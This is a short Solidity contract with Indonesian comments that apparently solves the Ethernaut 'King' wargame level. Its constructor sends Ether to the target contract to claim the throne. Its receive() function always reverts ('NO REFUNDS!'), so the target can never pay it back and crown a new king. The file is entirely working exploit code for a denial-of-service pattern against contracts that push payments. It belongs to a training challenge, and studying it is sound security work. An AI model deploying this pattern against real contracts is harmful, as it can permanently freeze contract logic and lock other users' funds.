// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    
    // Kita butuh constructor yang payable agar bisa diisi saldo saat deploy
    constructor(address _kingAddress) payable {
        // Kirim ETH ke kontrak King untuk merebut tahta.
        // Kita gunakan .call karena lebih fleksibel daripada transfer
        (bool sent, ) = _kingAddress.call{value: msg.value}("");
        require(sent, "Gagal mengirim Ether");
    }

    // INI SENJATA RAHASIANYA:
    // Fungsi ini akan terpanggil saat Ethernaut mencoba mengirim uang balik
    // untuk menggulingkan kita.
    // Kita sengaja membuat error (revert) di sini.
    receive() external payable {
        revert("I AM THE KING FOREVER! NO REFUNDS!");
    }
}